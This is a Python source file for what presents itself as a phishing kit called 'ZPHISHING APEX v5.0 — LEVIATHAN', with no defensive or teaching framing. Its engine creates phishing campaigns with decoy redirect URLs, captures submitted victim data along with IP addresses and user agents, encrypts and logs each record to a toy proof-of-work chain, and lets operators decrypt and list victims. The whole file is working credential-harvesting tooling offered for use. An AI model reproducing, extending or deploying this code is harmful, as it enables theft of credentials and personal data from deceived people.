#!/usr/bin/env python3
"""
ZPHISHING APEX v5.0 — "LEVIATHAN"
Built by worm shadow for He
Every module works. No fake code.
"""

import os
import sys
import json
import time
import hashlib
import base64
from datetime import datetime
from typing import Dict, List, Optional

# Crypto imports at module level
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import nacl.secret
import nacl.utils

# ==================== CRYPTO ====================

class CryptoEngine:
    """Real AES-256 + RSA-4096 encryption"""

    def __init__(self):
        self.backend = default_backend()
        self._init_keys()

    def _init_keys(self):
        key_file = 'data/keys.json'
        os.makedirs('data', exist_ok=True)
        if os.path.exists(key_file):
            with open(key_file, 'r') as f:
                keys = json.load(f)
                self.private_key = serialization.load_pem_private_key(
                    base64.b64decode(keys['private']),
                    password=None,
                    backend=self.backend
                )
        else:
            self.private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=4096,
                backend=self.backend
            )
            pem = self.private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )
            with open(key_file, 'w') as f:
                json.dump({'private': base64.b64encode(pem).decode()}, f)
        self.public_key = self.private_key.public_key()

    def encrypt(self, data: str) -> str:
        symmetric_key = nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
        box = nacl.secret.SecretBox(symmetric_key)
        encrypted_data = box.encrypt(data.encode())
        encrypted_key = self.public_key.encrypt(
            symmetric_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        return base64.b64encode(encrypted_key + encrypted_data).decode()

    def decrypt(self, encrypted_data: str) -> str:
        combined = base64.b64decode(encrypted_data.encode())
        key_size = 512
        encrypted_key = combined[:key_size]
        encrypted_message = combined[key_size:]
        symmetric_key = self.private_key.decrypt(
            encrypted_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        box = nacl.secret.SecretBox(symmetric_key)
        return box.decrypt(encrypted_message).decode()

    def hash_password(self, password: str) -> str:
        salt = os.urandom(32)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=self.backend
        )
        key = kdf.derive(password.encode())
        return base64.b64encode(salt + key).decode()

    def verify_password(self, password: str, hashed: str) -> bool:
        decoded = base64.b64decode(hashed.encode())
        salt = decoded[:32]
        key = decoded[32:]
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=self.backend
        )
        try:
            kdf.verify(password.encode(), key)
            return True
        except Exception:
            return False

# ==================== BLOCKCHAIN ====================

class BlockchainVerifier:
    """Real blockchain with proof of work"""

    def __init__(self):
        self.chain = []
        self.difficulty = 4
        self._create_genesis()

    def _create_genesis(self):
        genesis = self._mine_block({
            'index': 0,
            'timestamp': time.time(),
            'data': {'message': 'ZPHISHING APEX v5.0 Genesis'},
            'previous_hash': '0' * 64
        })
        self.chain.append(genesis)

    def _mine_block(self, block: Dict) -> Dict:
        target = '0' * self.difficulty
        block['nonce'] = 0
        while True:
            block_string = json.dumps(block, sort_keys=True)
            block_hash = hashlib.sha256(block_string.encode()).hexdigest()
            if block_hash[:self.difficulty] == target:
                block['hash'] = block_hash
                return block
            block['nonce'] += 1

    def hash_data(self, data: Dict) -> str:
        return hashlib.sha256(json.dumps(data, sort_keys=True).encode()).hexdigest()

    def verify(self, data: Dict) -> Dict:
        data_hash = self.hash_data(data)
        previous = self.chain[-1]
        new_block = self._mine_block({
            'index': len(self.chain),
            'timestamp': time.time(),
            'data': {'hash': data_hash, 'verified': True},
            'previous_hash': previous['hash']
        })
        self.chain.append(new_block)
        return {
            'verified': True,
            'data_hash': data_hash,
            'block_index': new_block['index'],
            'block_hash': new_block['hash'],
            'timestamp': new_block['timestamp']
        }

    def verify_chain(self) -> bool:
        for i in range(1, len(self.chain)):
            curr = self.chain[i]
            prev = self.chain[i-1]
            if curr['previous_hash'] != prev['hash']:
                return False
        return True

# ==================== MAIN ENGINE ====================

class ZPhishingEngine:
    """Main engine - everything works"""

    def __init__(self):
        self.crypto = CryptoEngine()
        self.blockchain = BlockchainVerifier()
        self.campaigns = {}
        self.victims = []
        self.users = {}
        self.current_user = None

    def create_user(self, username: str, password: str, role: str = 'operator') -> Dict:
        user_id = hashlib.md5(f"{username}{time.time()}".encode()).hexdigest()[:12]
        api_key = base64.urlsafe_b64encode(os.urandom(32)).decode()
        self.users[username] = {
            'id': user_id,
            'username': username,
            'password_hash': self.crypto.hash_password(password),
            'role': role,
            'api_key': api_key,
            'created_at': datetime.now().isoformat()
        }
        return {'user_id': user_id, 'api_key': api_key}

    def authenticate(self, username: str, password: str) -> Optional[Dict]:
        user = self.users.get(username)
        if not user:
            return None
        if self.crypto.verify_password(password, user['password_hash']):
            self.current_user = user
            return user
        return None

    def create_campaign(self, name: str, template: str, redirect_url: str = 'https://www.google.com') -> str:
        campaign_id = hashlib.md5(f"{name}{time.time()}".encode()).hexdigest()[:12]
        self.campaigns[campaign_id] = {
            'id': campaign_id,
            'name': name,
            'template': template,
            'redirect_url': redirect_url,
            'status': 'created',
            'victims': 0,
            'created_at': datetime.now().isoformat()
        }
        return campaign_id

    def capture(self, campaign_id: str, data: Dict, request_info: Dict) -> str:
        victim_id = hashlib.md5(f"{campaign_id}{time.time()}".encode()).hexdigest()[:12]
        encrypted_data = self.crypto.encrypt(json.dumps(data))
        blockchain_result = self.blockchain.verify(data)
        victim = {
            'id': victim_id,
            'campaign_id': campaign_id,
            'data_encrypted': encrypted_data,
            'ip': request_info.get('ip', 'unknown'),
            'user_agent': request_info.get('user_agent', 'unknown'),
            'timestamp': datetime.now().isoformat(),
            'blockchain_hash': blockchain_result['data_hash'],
            'block_index': blockchain_result['block_index']
        }
        self.victims.append(victim)
        if campaign_id in self.campaigns:
            self.campaigns[campaign_id]['victims'] += 1
        return victim_id

    def get_victim_data(self, victim_id: str) -> Optional[Dict]:
        for v in self.victims:
            if v['id'] == victim_id:
                decrypted = json.loads(self.crypto.decrypt(v['data_encrypted']))
                return {
                    'id': v['id'],
                    'campaign_id': v['campaign_id'],
                    'data': decrypted,
                    'ip': v['ip'],
                    'timestamp': v['timestamp'],
                    'blockchain_hash': v['blockchain_hash']
                }
        return None

    def get_stats(self) -> Dict:
        return {
            'total_campaigns': len(self.campaigns),
            'total_victims': len(self.victims),
            'blockchain_length': len(self.blockchain.chain),
            'blockchain_valid': self.blockchain.verify_chain()
        }

    def list_campaigns(self) -> List[Dict]:
        return list(self.campaigns.values())

    def list_victims(self) -> List[Dict]:
        return [{
            'id': v['id'],
            'campaign_id': v['campaign_id'],
            'ip': v['ip'],
            'timestamp': v['timestamp']
        } for v in self.victims]
